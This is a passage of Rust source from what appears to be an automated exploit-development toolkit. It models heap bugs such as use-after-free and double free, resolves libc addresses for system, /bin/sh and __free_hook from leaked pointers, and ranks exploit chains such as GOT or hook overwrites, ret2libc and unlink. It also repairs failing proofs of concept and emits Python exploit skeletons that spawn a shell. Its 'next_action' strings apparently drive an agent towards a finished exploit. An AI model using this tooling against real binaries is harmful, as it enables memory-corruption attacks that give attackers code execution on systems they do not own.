    stderr: &mut Vec<u8>,
    retain: usize,
    needle: &[u8],
    deadline: Instant,
) -> bool {
    if needle.is_empty() || find_bytes(combined, needle).is_some() {
        return true;
    }
    while Instant::now() < deadline {
        let now = Instant::now();
        let wait = (deadline - now).min(Duration::from_millis(25));
        match rx.recv_timeout(wait) {
            Ok((stream, chunk)) => {
                append_drive_chunk(stream, &chunk, combined, stdout, stderr, retain);
                if find_bytes(combined, needle).is_some() {
                    return true;
                }
            }
            Err(mpsc::RecvTimeoutError::Timeout) => {}
            Err(mpsc::RecvTimeoutError::Disconnected) => break,
        }
    }
    false
}

fn drain_drive_output(
    rx: &mpsc::Receiver<(&'static str, Vec<u8>)>,
    combined: &mut Vec<u8>,
    stdout: &mut Vec<u8>,
    stderr: &mut Vec<u8>,
    retain: usize,
    deadline: Instant,
) {
    while Instant::now() < deadline {
        match rx.recv_timeout(Duration::from_millis(10)) {
            Ok((stream, chunk)) => {
                append_drive_chunk(stream, &chunk, combined, stdout, stderr, retain)
            }
            Err(mpsc::RecvTimeoutError::Timeout) => {}
            Err(mpsc::RecvTimeoutError::Disconnected) => break,
        }
    }
}

fn append_drive_chunk(
    stream: &str,
    chunk: &[u8],
    combined: &mut Vec<u8>,
    stdout: &mut Vec<u8>,
    stderr: &mut Vec<u8>,
    retain: usize,
) {
    append_capped(combined, chunk, retain);
    if stream == "stdout" {
        append_capped(stdout, chunk, retain);
    } else {
        append_capped(stderr, chunk, retain);
    }
}

fn append_capped(buf: &mut Vec<u8>, chunk: &[u8], retain: usize) {
    buf.extend_from_slice(chunk);
    if buf.len() > retain {
        let excess = buf.len() - retain;
        buf.drain(..excess);
    }
}

fn lossy_tail(bytes: &[u8], max: usize) -> String {
    let start = bytes.len().saturating_sub(max);
    String::from_utf8_lossy(&bytes[start..]).into_owned()
}

fn hex_tail(bytes: &[u8], max: usize) -> String {
    let start = bytes.len().saturating_sub(max);
    hex::encode(&bytes[start..])
}

fn parse_proc_maps(bytes: &[u8]) -> Vec<serde_json::Value> {
    let text = String::from_utf8_lossy(bytes);
    let mut out = Vec::new();
    let mut seen = std::collections::BTreeSet::new();
    for line in text.lines() {
        let Some((range, rest)) = line.split_once(' ') else {
            continue;
        };
        let Some((start_s, end_s)) = range.split_once('-') else {
            continue;
        };
        let (Ok(start), Ok(end)) = (
            u64::from_str_radix(start_s, 16),
            u64::from_str_radix(end_s, 16),
        ) else {
            continue;
        };
        if start >= end || !seen.insert((start, end)) {
            continue;
        }
        let fields: Vec<&str> = rest.split_whitespace().collect();
        let perms = fields.first().copied().unwrap_or("");
        let path = fields.get(4..).map(|v| v.join(" ")).unwrap_or_default();
        out.push(serde_json::json!({
            "start": format!("0x{start:x}"),
            "end": format!("0x{end:x}"),
            "perms": perms,
            "path": path,
            "kind": mapping_kind(&path),
        }));
        if out.len() >= 256 {
            break;
        }
    }
    out
}

fn mapping_kind(path: &str) -> &'static str {
    let lower = path.to_ascii_lowercase();
    if lower.contains("libc") {
        "libc"
    } else if lower.contains("[heap]") {
        "heap"
    } else if lower.contains("[stack]") {
        "stack"
    } else if lower.contains("ld-") || lower.contains("ld-linux") {
        "loader"
    } else if path.starts_with('/') {
        "file"
    } else {
        "anonymous"
    }
}

fn extract_pointer_candidates(
    bytes: &[u8],
    mappings: &[serde_json::Value],
    arch: Option<&str>,
    limit: usize,
) -> Vec<serde_json::Value> {
    let mut seen = std::collections::BTreeSet::new();
    let mut out = Vec::new();
    for value in ascii_hex_values(bytes) {
        push_pointer_candidate(value, "ascii_hex", mappings, &mut seen, &mut out, limit);
        if out.len() >= limit {
            return out;
        }
    }
    let width = if arch == Some("x86_64") { 8 } else { 4 };
    if bytes.len() >= width {
        for offset in 0..=bytes.len() - width {
            let value = if width == 8 {
                u64::from_le_bytes(bytes[offset..offset + 8].try_into().unwrap())
            } else {
                u32::from_le_bytes(bytes[offset..offset + 4].try_into().unwrap()) as u64
            };
            if plausible_pointer(value, width) {
                push_pointer_candidate(
                    value,
                    "raw_little_endian",
                    mappings,
                    &mut seen,
                    &mut out,
                    limit,
                );
                if out.len() >= limit {
                    break;
                }
            }
        }
    }
    out
}

fn ascii_hex_values(bytes: &[u8]) -> Vec<u64> {
    let text = String::from_utf8_lossy(bytes);
    let mut out = Vec::new();
    for token in text.split(|c: char| !(c.is_ascii_hexdigit() || c == 'x' || c == 'X')) {
        let Some(hex) = token
            .strip_prefix("0x")
            .or_else(|| token.strip_prefix("0X"))
        else {
            continue;
        };
        if (6..=16).contains(&hex.len()) {
            if let Ok(value) = u64::from_str_radix(hex, 16) {
                out.push(value);
            }
        }
    }
    out
}

fn plausible_pointer(value: u64, width: usize) -> bool {
    if width == 8 {
        (0x0000_4000_0000..=0x0000_7fff_ffff_ffff).contains(&value)
            || (0x7f00_0000_0000..=0x7fff_ffff_ffff).contains(&value)
    } else {
        (0x0804_0000..=0xffff_ffff).contains(&value)
    }
}

fn push_pointer_candidate(
    value: u64,
    source: &str,
    mappings: &[serde_json::Value],
    seen: &mut std::collections::BTreeSet<u64>,
    out: &mut Vec<serde_json::Value>,
    limit: usize,
) {
    if out.len() >= limit || !seen.insert(value) {
        return;
    }
    let class = classify_pointer(value, mappings);
    if class == "unknown" && source == "raw_little_endian" {
        return;
    }
    out.push(serde_json::json!({
        "value": format!("0x{value:x}"),
        "source": source,
        "class": class,
    }));
}

fn classify_pointer(value: u64, mappings: &[serde_json::Value]) -> String {
    for mapping in mappings {
        let Some(start) = mapping
            .get("start")
            .and_then(|v| v.as_str())
            .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok())
        else {
            continue;
        };
        let Some(end) = mapping
            .get("end")
            .and_then(|v| v.as_str())
            .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok())
        else {
            continue;
        };
        if (start..end).contains(&value) {
            return mapping
                .get("kind")
                .and_then(|v| v.as_str())
                .unwrap_or("mapped")
                .to_string();
        }
    }
    "unknown".to_string()
}

fn leak_want_present(
    want: &str,
    mappings: &[serde_json::Value],
    pointers: &[serde_json::Value],
) -> bool {
    let want = want.to_ascii_lowercase();
    match want.as_str() {
        "maps" => !mappings.is_empty(),
        "pointer" | "pointers" => !pointers.is_empty(),
        "libc" | "heap" | "stack" | "binary" | "file" | "loader" => {
            mappings.iter().any(|m| {
                m.get("kind")
                    .and_then(|v| v.as_str())
                    .is_some_and(|kind| kind == want)
            }) || pointers.iter().any(|p| {
                p.get("class")
                    .and_then(|v| v.as_str())
                    .is_some_and(|class| class == want)
            })
        }
        _ => false,
    }
}

#[derive(Clone, Debug)]
struct HeapSlot {
    allocated: bool,
    size: Option<u64>,
    generation: u64,
    freed_count: u64,
    last_tag: Option<String>,
}

fn heap_model_json(binary: &Path, events_spec: &str) -> Result<serde_json::Value> {
    let events = action_list_from_spec(events_spec)?;
    let mut slots: std::collections::BTreeMap<String, HeapSlot> = std::collections::BTreeMap::new();
    let mut size_bins: std::collections::BTreeMap<u64, Vec<String>> =
        std::collections::BTreeMap::new();
    let mut signals = Vec::new();
    let mut timeline = Vec::new();
    let mut generation = 0u64;

    for (idx, event) in events.iter().enumerate() {
        let obj = event
            .as_object()
            .ok_or_else(|| anyhow::anyhow!("event {idx} must be an object"))?;
        let op = obj
            .get("op")
            .or_else(|| obj.get("action"))
            .and_then(|v| v.as_str())
            .unwrap_or("unknown")
            .to_ascii_lowercase();
        let id = obj
            .get("id")
            .or_else(|| obj.get("index"))
            .or_else(|| obj.get("slot"))
            .map(|v| scalar_to_string(v, idx, "id"))
            .transpose()?
            .unwrap_or_else(|| "0".to_string());
        let size = obj.get("size").and_then(json_u64);
        let tag = obj
            .get("tag")
            .or_else(|| obj.get("data"))
            .and_then(|v| v.as_str())
            .map(|s| s.to_string());

        match op.as_str() {
            "alloc" | "malloc" | "calloc" | "add" | "new" => {
                generation += 1;
                if slots.get(&id).is_some_and(|slot| slot.allocated) {
                    signals.push(heap_signal(
                        idx,
                        "alloc_over_live_slot",
                        &id,
                        "allocation overwrote a still-live logical slot",
                    ));
                }
                let reused_from = size.and_then(|sz| {
                    let bin = size_bins.get_mut(&sz)?;
                    bin.pop()
                });
                if let Some(prev) = &reused_from {
                    signals.push(serde_json::json!({
                        "event": idx,
                        "kind": "same_size_reuse",
                        "slot": id,
                        "reused_freed_slot": prev,
                        "why_it_matters": "same-size allocation reused a freed chunk candidate; compare aliases with edit/show probes"
                    }));
                }
                slots.insert(
                    id.clone(),
                    HeapSlot {
                        allocated: true,
                        size,
                        generation,
                        freed_count: 0,
                        last_tag: tag.clone(),
                    },
                );
                timeline.push(serde_json::json!({"event": idx, "op": op, "id": id, "size": size, "reused_from": reused_from}));
            }
            "free" | "delete" | "remove" => {
                let slot = slots.entry(id.clone()).or_insert(HeapSlot {
                    allocated: false,
                    size,
                    generation: 0,
                    freed_count: 0,
                    last_tag: None,
                });
                if !slot.allocated {
                    signals.push(heap_signal(
                        idx,
                        "double_free_or_invalid_free",
                        &id,
                        "free/delete reached an already-free or never-allocated logical slot",
                    ));
                }
                slot.allocated = false;
                slot.freed_count += 1;
                if let Some(sz) = slot.size.or(size) {
                    size_bins.entry(sz).or_default().push(id.clone());
                }
                timeline.push(serde_json::json!({"event": idx, "op": op, "id": id, "size": slot.size.or(size), "freed_count": slot.freed_count}));
            }
            "edit" | "write" | "update" => {
                match slots.get_mut(&id) {
                    Some(slot) if slot.allocated => {
                        slot.last_tag = tag.clone();
                    }
                    Some(slot) => {
                        slot.last_tag = tag.clone();
                        signals.push(heap_signal(
                            idx,
                            "use_after_free_write",
                            &id,
                            "edit/write reached a freed logical slot",
                        ));
                    }
                    None => signals.push(heap_signal(
                        idx,
                        "write_unknown_slot",
                        &id,
                        "edit/write reached a slot not seen in the modeled allocation history",
                    )),
                }
                timeline.push(serde_json::json!({"event": idx, "op": op, "id": id, "tag": tag}));
            }
            "show" | "print" | "read" => {
                match slots.get(&id) {
                    Some(slot) if !slot.allocated => {
                        signals.push(heap_signal(idx, "use_after_free_read", &id, "show/print reached a freed logical slot and may leak metadata or stale function pointers"));
                    }
                    None => signals.push(heap_signal(
                        idx,
                        "read_unknown_slot",
                        &id,
                        "show/print reached a slot not seen in the modeled allocation history",
                    )),
                    _ => {}
                }
                timeline.push(serde_json::json!({"event": idx, "op": op, "id": id}));
            }
            "realloc" => {
                let old = slots.get(&id).cloned();
                if matches!(size, Some(0)) {
                    signals.push(heap_signal(idx, "realloc_zero_lifetime_edge", &id, "realloc(slot, 0) often frees storage while programs accidentally keep the old pointer"));
                }
                if old.as_ref().is_some_and(|slot| !slot.allocated) {
                    signals.push(heap_signal(
                        idx,
                        "realloc_freed_slot",
                        &id,
                        "realloc reached a freed logical slot",
                    ));
                }
                generation += 1;
                slots.insert(
                    id.clone(),
                    HeapSlot {
                        allocated: !matches!(size, Some(0)),
                        size,
                        generation,
                        freed_count: old.map(|slot| slot.freed_count).unwrap_or(0),
                        last_tag: tag.clone(),
                    },
                );
                timeline.push(serde_json::json!({"event": idx, "op": op, "id": id, "size": size}));
            }
            _ => {
                signals.push(serde_json::json!({
                    "event": idx,
                    "kind": "unknown_event",
                    "op": op,
                    "next_action": "Normalize this transcript event to alloc/free/edit/show/realloc so heap-model can reason about it."
                }));
            }
        }
    }

    let slot_values: Vec<_> = slots
        .iter()
        .map(|(id, slot)| {
            serde_json::json!({
                "id": id,
                "allocated": slot.allocated,
                "size": slot.size,
                "generation": slot.generation,
                "freed_count": slot.freed_count,
                "last_tag": slot.last_tag,
            })
        })
        .collect();
    let suggested = heap_model_next_steps(&signals);
    Ok(serde_json::json!({
        "kind": "heap_model",
        "binary": binary,
        "events": events.len(),
        "slots": slot_values,
        "signals": signals,
        "suggested_probes": suggested,
        "next_action": "Convert the highest-confidence signal into an exploit-drive probe that proves aliasing, UAF read/write, or duplicate allocation before writing the final PoC."
    }))
}

fn heap_signal(event: usize, kind: &str, slot: &str, why: &str) -> serde_json::Value {
    serde_json::json!({
        "event": event,
        "kind": kind,
        "slot": slot,
        "why_it_matters": why,
    })
}

fn heap_model_next_steps(signals: &[serde_json::Value]) -> Vec<serde_json::Value> {
    let has = |needle: &str| {
        signals.iter().any(|s| {
            s.get("kind")
                .and_then(|v| v.as_str())
                .is_some_and(|kind| kind == needle)
        })
    };
    let mut out = Vec::new();
    if has("double_free_or_invalid_free") || has("same_size_reuse") {
        out.push(serde_json::json!({
            "goal": "prove duplicate allocation or alias",
            "probe": "allocate A/B, free A/B/A when legal, allocate twice with distinct marker tags, then show/edit both logical slots",
            "success_signal": "editing one logical slot changes the other, or two allocations expose identical content/pointer behavior"
        }));
    }
    if has("use_after_free_read") {
        out.push(serde_json::json!({
            "goal": "turn UAF read into leak",
            "probe": "free a chunk, trigger show/print on the stale slot, classify output with leak-probe/libc-resolve",
            "success_signal": "printed bytes contain mapped pointer candidate or libc/heap address"
        }));
    }
    if has("use_after_free_write") {
        out.push(serde_json::json!({
            "goal": "turn UAF write into control",
            "probe": "reallocate freed storage with pointer-sized marker, then trigger the stale callback/show/free path under debug-probe",
            "success_signal": "pc/eip/rip or dereferenced pointer reaches the marker-controlled value"
        }));
    }
    if has("realloc_zero_lifetime_edge") || has("realloc_freed_slot") {
        out.push(serde_json::json!({
            "goal": "prove realloc stale pointer",
            "probe": "realloc(slot, 0), then show/edit/free the same logical slot and compare against a fresh same-size allocation",
            "success_signal": "stale slot remains reachable after realloc freed or moved its backing chunk"
        }));
    }
    if out.is_empty() {
        out.push(serde_json::json!({
            "goal": "complete lifecycle map",
            "probe": "record alloc/free/edit/show/realloc events with stable ids and sizes, then rerun heap-model",
            "success_signal": "model emits UAF, double-free, same-size reuse, or realloc lifetime signals"
        }));
    }
    out
}

fn libc_resolve_json(
    binary: &Path,
    leak: Option<&str>,
    symbol: Option<&str>,
    base: Option<&str>,
    explicit_libc: Option<&Path>,
    targets: &[String],
) -> Result<serde_json::Value> {
    let libc = select_libc_path(binary, explicit_libc)?;
    let offsets = shared_object_symbol_offsets(&libc)?;
    let symbols = offsets
        .get("symbols")
        .and_then(|v| v.as_object())
        .cloned()
        .unwrap_or_default();
    let base_value = if let Some(base) = base {
        Some(parse_hex_u64(base).with_context(|| format!("parse --base {base}"))?)
    } else if let (Some(leak), Some(symbol)) = (leak, symbol) {
        let leak_value = parse_hex_u64(leak).with_context(|| format!("parse --leak {leak}"))?;
        let offset = symbol_offset_from_map(&symbols, symbol)
            .ok_or_else(|| anyhow::anyhow!("symbol '{symbol}' not found in {}", libc.display()))?;
        Some(leak_value.wrapping_sub(offset))
    } else {
        None
    };
    let target_names = if targets.is_empty() {
        vec![
            "system".to_string(),
            "exit".to_string(),
            "__free_hook".to_string(),
            "__malloc_hook".to_string(),
            "str_bin_sh".to_string(),
            "environ".to_string(),
        ]
    } else {
        targets.to_vec()
    };
    let resolved: Vec<_> = target_names
        .iter()
        .map(|name| {
            let offset = symbol_offset_from_map(&symbols, name);
            serde_json::json!({
                "symbol": name,
                "offset": offset.map(|v| format!("0x{v:x}")),
                "address": base_value.and_then(|base| offset.map(|off| format!("0x{:x}", base + off))),
            })
        })
        .collect();
    Ok(serde_json::json!({
        "kind": "libc_resolve",
        "binary": binary,
        "libc": libc,
        "leak": leak,
        "leak_symbol": symbol,
        "libc_base": base_value.map(|v| format!("0x{v:x}")),
        "resolved": resolved,
        "available_symbols": symbols,
        "next_action": if base_value.is_some() {
            "Use resolved addresses in the next PoC stage and verify with exploit-verify; prefer a deterministic exit/output predicate."
        } else {
            "Provide --leak and --symbol, or --base, then rerun libc-resolve to materialize final-stage addresses."
        },
    }))
}

fn exploit_plan_json(
    binary: &Path,
    primitives: &[String],
    libc_base: Option<&str>,
    heap_base: Option<&str>,
) -> Result<serde_json::Value> {
    let context = build_exploit_context(binary, 8)?;
    let protections = context.get("protections").cloned().unwrap_or_default();
    let primitive_set: std::collections::BTreeSet<String> = primitives
        .iter()
        .map(|p| p.to_ascii_lowercase().replace('_', "-"))
        .collect();
    let has = |p: &str| primitive_set.contains(p);
    let relro = protections
        .get("relro")
        .and_then(|v| v.as_str())
        .unwrap_or("unknown");
    let pie = protections
        .get("pie")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let canary = protections
        .get("canary_import")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let libc_known = libc_base.and_then(|s| parse_hex_u64(s).ok()).is_some();
    let heap_known = heap_base.and_then(|s| parse_hex_u64(s).ok()).is_some();
    let mut chains = Vec::new();

    if (has("arbitrary-write") || has("write-what-where")) && libc_known {
        let target = if relro != "full" {
            "GOT overwrite or __free_hook/system depending on call path"
        } else {
            "__free_hook/system, __malloc_hook gadget, vtable/callback, or FILE/exit structure"
        };
        chains.push(serde_json::json!({
            "rank": chains.len() + 1,
            "name": "libc-resolved arbitrary write",
            "requires": ["arbitrary-write", "libc-base"],
            "target": target,
            "steps": [
                "Use libc-resolve to materialize system, /bin/sh, hooks, and exit.",
                "Write selected target address with the proven primitive.",
                "Trigger the corresponding free/malloc/callback/exit path.",
                "Verify with returncode=42 or exact command marker."
            ],
            "risks": ["hook availability varies by libc", "full RELRO blocks GOT overwrite"]
        }));
    }
    if (has("uaf") || has("double-free") || has("tcache") || has("fastbin")) && !libc_known {
        chains.push(serde_json::json!({
            "rank": chains.len() + 1,
            "name": "heap primitive to libc leak",
            "requires": ["heap-lifecycle signal"],
            "target": "freed metadata, GOT pointer, FILE pointer, or /proc/self/maps",
            "steps": [
                "Use heap-model to prove the lifecycle bug as UAF read, duplicate allocation, or overlap.",
                "Use leak-probe or a show primitive to harvest mapped pointers.",
                "Run libc-resolve with the leaked symbol/base before final overwrite."
            ],
            "risks": ["safe-linking/tcache version may require heap base", "printed data may truncate at NUL"]
        }));
    }
    if has("overflow") || has("stack-overflow") || has("rop") {
        chains.push(serde_json::json!({
            "rank": chains.len() + 1,
            "name": "stack control to leak/ROP",
            "requires": ["offset", if canary { "canary leak" } else { "no canary or bypass" }],
            "target": if libc_known { "ret2libc final chain" } else { "stage-1 PLT/GOT leak then final chain" },
            "steps": [
                "Run crash-offset/debug-probe to confirm control and exact offset.",
                "If canary is present, establish leak before writing return state.",
                "Leak libc when needed, return to a stable input state, then send final chain."
            ],
            "risks": ["PIE requires binary base leak", "stack alignment differs on x86_64"]
        }));
    }
    if has("unlink") || has("linked-list") {
        chains.push(serde_json::json!({
            "rank": chains.len() + 1,
            "name": "linked-structure write-what-where",
            "requires": ["controllable node pointers", "delete/unlink trigger"],
            "target": if relro == "full" { "stack/control structure after leak" } else { "GOT entry or stack control word" },
            "steps": [
                "Recover node layout with decompile-enhanced around add/list/delete.",
                "Craft fake node fields, trigger delete/unlink once, and observe write target.",
                "Use first write for leak or final control depending on ASLR/protections."
            ],
            "risks": ["integrity checks may constrain next/prev", "bad target can terminate before verifier predicate"]
        }));
    }
    if chains.is_empty() {
        chains.push(serde_json::json!({
            "rank": 1,
            "name": "missing primitive proof",
            "requires": ["one concrete leak/read/write/control primitive"],
            "target": "next observation, not final exploit",
            "steps": [
                "Use exploit-drive to map menu states.",
                "Use heap-model for lifecycle transcripts or crash-offset for overflow input.",
                "Use leak-probe/libc-resolve once any pointer-like output appears."
            ],
            "risks": ["writing a final PoC before proving a primitive causes attempt churn"]
        }));
    }
    Ok(serde_json::json!({
        "kind": "exploit_plan",
        "binary": binary,
        "protections": protections,
        "primitives": primitive_set,
        "libc_base_known": libc_known,
        "heap_base_known": heap_known,
        "pie": pie,
        "canary": canary,
        "ranked_chains": chains,
        "next_action": "Execute the first chain's first unproven prerequisite with exploit-drive, leak-probe, debug-probe, or exploit-verify; do not skip directly to final overwrite."
    }))
}

fn poc_repair_json(
    binary: &Path,
    script: &Path,
    verify_spec: Option<&str>,
    sysroot: Option<&Path>,
    timeout_secs: u64,
    expect_target_exit: Option<i32>,
    expect_output: Option<&str>,
) -> Result<serde_json::Value> {
    let verify = if let Some(spec) = verify_spec {
        read_json_or_inline(spec)?
    } else {
        verify_exploit_script(
            script,
            binary,
            timeout_secs,
            None,
            expect_target_exit,
            expect_output,
            sysroot,
            &[],
        )?
    };
    let stdout = verify.get("stdout").and_then(|v| v.as_str()).unwrap_or("");
    let stderr = verify.get("stderr").and_then(|v| v.as_str()).unwrap_or("");
    let combined = format!("{stdout}\n{stderr}");
    let script_text = std::fs::read_to_string(script).unwrap_or_default();
    let mut diagnoses = Vec::new();
    if verify
        .get("success")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        diagnoses.push(serde_json::json!({"kind": "already_successful", "repair": "No repair needed; preserve this PoC and report SCRIPT_READY."}));
    }
    if verify
        .get("timed_out")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
        || combined.to_ascii_lowercase().contains("timeout")
    {
        diagnoses.push(serde_json::json!({"kind": "timeout_or_menu_desync", "repair": "Replace raw communicate/read loops with recv_until/sendline_after-equivalent logic; first reproduce transcript using exploit-drive."}));
    }
    if combined.contains("No such file or directory")
        || combined.contains("not found")
        || combined.contains("ld-linux")
    {
        diagnoses.push(serde_json::json!({"kind": "loader_or_path", "repair": "Use KAIJU_BINARY/KAIJULAB_BINARY and KAIJU_SYSROOT/KAIJULAB_SYSROOT, and spawn qemu with -L sysroot for foreign arch."}));
    }
    if combined.contains("SCRIPT_READY_BLOCKED") {
        diagnoses.push(serde_json::json!({"kind": "blocked_marker_misuse", "repair": "Do not use SCRIPT_READY_BLOCKED for exploit difficulty; continue with structured primitive proof or environment fix."}));
    }
    if combined.contains("returncode=")
        && !verify
            .get("success")
            .and_then(|v| v.as_bool())
            .unwrap_or(false)
    {
        diagnoses.push(serde_json::json!({"kind": "wrong_exit_predicate", "repair": "Make the target child exit with the expected code or rerun exploit-verify with the predicate the PoC actually proves."}));
    }
    if combined.contains("SIGSEGV")
        || combined.contains("Segmentation fault")
        || combined.contains("signal")
    {
        diagnoses.push(serde_json::json!({"kind": "crash_without_control_proof", "repair": "Run debug-probe or crash-offset with the same input; repair offset/register target before adding libc stages."}));
    }
    if script_text.contains("TODO") || script_text.contains("pass\n") {
        diagnoses.push(serde_json::json!({"kind": "incomplete_scaffold", "repair": "Fill the scaffold transcript first; use exploit-drive output to copy stable menu actions into the PoC."}));
    }
    if script_text.contains("p64(") && script_text.contains("i386") {
        diagnoses.push(serde_json::json!({"kind": "word_size_mismatch", "repair": "Use p32 for i386 targets unless intentionally writing 64-bit data into a file or protocol."}));
    }
    if !script_text.contains("KAIJU_SYSROOT") && !script_text.contains("KAIJULAB_SYSROOT") {
        diagnoses.push(serde_json::json!({"kind": "missing_sysroot_env", "repair": "Read KAIJU_SYSROOT/KAIJULAB_SYSROOT in the PoC so exploit-verify and exploit-loop use the same loader environment."}));
    }
    if diagnoses.is_empty() {
        diagnoses.push(serde_json::json!({"kind": "needs_narrower_observation", "repair": "Use exploit-plan to identify the first unproven primitive, then add one debug/leak/drive probe before editing final payload bytes."}));
    }
    Ok(serde_json::json!({
        "kind": "poc_repair",
        "binary": binary,
        "script": script,
        "verify": verify,
        "diagnoses": diagnoses,
        "next_action": "Apply exactly one repair, rerun exploit-verify with an explicit predicate, then feed the new result back into poc-repair if it still fails."
    }))
}

fn poc_synthesize_json(
    binary: &Path,
    chain: &str,
    primitives: &[String],
    offset: Option<usize>,
    libc_base: Option<&str>,
    heap_base: Option<&str>,
    sysroot: Option<&Path>,
    output: Option<&Path>,
) -> Result<serde_json::Value> {
    let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
    let arch = binary_arch_from_data(&data).unwrap_or_else(|| "unknown".to_string());
    let interpreter = binary_interpreter_from_data(&data);
    let effective_sysroot = effective_sysroot(sysroot, Some(&arch), interpreter.as_deref());
    let runner = default_runner_for_arch(Some(&arch));
    let libc = select_libc_path(binary, None).ok();
    let loader = select_matching_libc_loader(binary, effective_sysroot.as_deref());
    let symbols = libc
        .as_deref()
        .and_then(|path| shared_object_symbol_offsets(path).ok())
        .and_then(|v| v.get("symbols").and_then(|s| s.as_object()).cloned())
        .unwrap_or_default();
    let text = poc_skeleton_text(
        binary,
        chain,
        primitives,
        &arch,
        runner.as_deref(),
        effective_sysroot.as_deref(),
        loader.as_deref(),
        offset,
        libc_base,
        heap_base,
        &symbols,
    )?;
    if let Some(output) = output {
        std::fs::write(output, &text).with_context(|| format!("write {}", output.display()))?;
    }
    Ok(serde_json::json!({
        "kind": "poc_synthesize",
        "binary": binary,
        "chain": chain,
        "primitives": primitives,
        "arch": arch,
        "runner": runner,
        "sysroot": effective_sysroot.as_deref(),
        "loader": loader,
        "adjacent_libc": libc,
        "output": output,
        "text": text,
        "next_action": "Fill only the transcript/primitive-specific TODOs, then run exploit-verify with an explicit predicate and feed failures to poc-repair."
    }))
}

fn select_matching_libc_loader(binary: &Path, sysroot: Option<&Path>) -> Option<PathBuf> {
    let mut loaders = Vec::new();
    for obj in adjacent_shared_objects(binary) {
        let Some(name) = obj
            .get("path")
            .and_then(|v| v.as_str())
            .and_then(|p| Path::new(p).file_name())
            .and_then(|v| v.to_str())
        else {
            continue;
        };
        if !name.to_ascii_lowercase().contains("libc") {
            continue;
        }
        if let Some(values) = obj.get("matching_loaders").and_then(|v| v.as_array()) {
            loaders.extend(values.iter().filter_map(|v| v.as_str()).map(PathBuf::from));
        }
    }
    if let Some(root) = sysroot {
        if let Some(path) = loaders.iter().find(|path| path.starts_with(root)) {
            return Some(path.clone());
        }
    }
    loaders.into_iter().next()
}

fn poc_skeleton_text(
    binary: &Path,
    chain: &str,
    primitives: &[String],
    arch: &str,
    runner: Option<&str>,
    sysroot: Option<&Path>,
    loader: Option<&Path>,
    offset: Option<usize>,
    libc_base: Option<&str>,
    heap_base: Option<&str>,
    symbols: &serde_json::Map<String, serde_json::Value>,
) -> Result<String> {
    let width = if arch == "x86_64" { 8 } else { 4 };
    let packer = if width == 8 { "p64" } else { "p32" };
    let offset = offset.unwrap_or(0);
    let qemu_default = runner.unwrap_or("");
    let sysroot_default = sysroot
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    let loader_default = loader
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    let libdir_default = loader
        .and_then(|p| p.parent())
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    let base = libc_base.unwrap_or("0");
    let heap = heap_base.unwrap_or("0");
    let primitive_note = if primitives.is_empty() {
        "none supplied".to_string()
    } else {
        primitives.join(", ")
    };
    let sym_const = |name: &str| {
        symbol_offset_from_map(symbols, name)
            .map(|v| format!("0x{v:x}"))
            .unwrap_or_else(|| "0".to_string())
    };
    let chain_body = match chain.to_ascii_lowercase().replace('_', "-").as_str() {
        "ret2libc" | "rop" | "stack-rop" => format!(
            r#"    # TODO: drive target to the vulnerable stack input before sending payload.
    libc = LIBC_BASE
    system = libc + OFF_SYSTEM
    bin_sh = libc + OFF_BIN_SH
    exit_fn = libc + OFF_EXIT
    payload = b"A" * OFFSET
    payload += {packer}(system)
    if WORD == 4:
        payload += {packer}(exit_fn)
        payload += {packer}(bin_sh)
    else:
        # TODO: set argument register first, e.g. pop rdi; ret; bin_sh; system.
        payload += {packer}(bin_sh)
        payload += {packer}(exit_fn)
    t.line(payload)
"#
        ),
        "arbitrary-write" | "heap-hook" | "hook" => format!(
            r#"    libc = LIBC_BASE
    system = libc + OFF_SYSTEM
    bin_sh = libc + OFF_BIN_SH
    free_hook = libc + OFF_FREE_HOOK
    # TODO: replace write_where/write_what with the proven arbitrary-write primitive.
    write_where = free_hook
    write_what = system
    # primitive_write(t, write_where, {packer}(write_what))
    # TODO: allocate or edit a chunk containing b"/bin/sh\x00", then trigger free(chunk).
"#
        ),
        "uaf-fnptr" | "function-pointer" => format!(
            r#"    libc = LIBC_BASE
    system = libc + OFF_SYSTEM
    # TODO: allocate object A with callable/function pointer field, free A, reallocate same size.
    replacement = {packer}(system) + b";/bin/sh\x00"
    # TODO: send replacement through the allocation/edit path, then trigger stale call/show.
"#
        ),
        "unlink" | "linked-list" => format!(
            r#"    # TODO: recover node layout: prev/next/value fields and delete/unlink write formula.
    # Craft fake node so unlink writes a controlled pointer to a selected target.
    target = LIBC_BASE + OFF_FREE_HOOK if LIBC_BASE else 0
    value = LIBC_BASE + OFF_SYSTEM if LIBC_BASE else 0
    fake_node = {packer}(0) + {packer}(target) + {packer}(value)
    # TODO: insert fake_node through normal menu flow, then trigger delete/unlink.
"#
        ),
        "leak-stage" | "leak" => {
            r#"    # TODO: use the proven show/read primitive or /proc/self/maps path to print a pointer.
    # Print leaks in a parseable form:
    # print("LEAK=0x%x" % leak)
    # Then run: kaijulab api libc-resolve --file "$KAIJU_BINARY" --leak 0xADDR --symbol SYMBOL
"#
            .to_string()
        }
        other => anyhow::bail!("unknown --chain '{other}'"),
    };
    Ok(format!(
        r#"#!/usr/bin/env python3
import os
import select
import struct
import subprocess
import sys
import time

BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {binary:?}
# Proven primitives supplied to poc-synthesize: {primitive_note}
SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot_default:?}
RUNNER = os.environ.get("KAIJU_RUNNER") or {qemu_default:?}
LOADER = os.environ.get("KAIJU_LOADER") or os.environ.get("KAIJULAB_LOADER") or {loader_default:?}
LIBDIR = os.environ.get("KAIJU_LIBDIR") or os.environ.get("KAIJULAB_LIBDIR") or {libdir_default:?}
WORD = {width}
OFFSET = {offset}
LIBC_BASE = int(os.environ.get("KAIJU_LIBC_BASE", {base:?}), 0)
HEAP_BASE = int(os.environ.get("KAIJU_HEAP_BASE", {heap:?}), 0)
OFF_SYSTEM = {off_system}
OFF_EXIT = {off_exit}
OFF_FREE_HOOK = {off_free_hook}
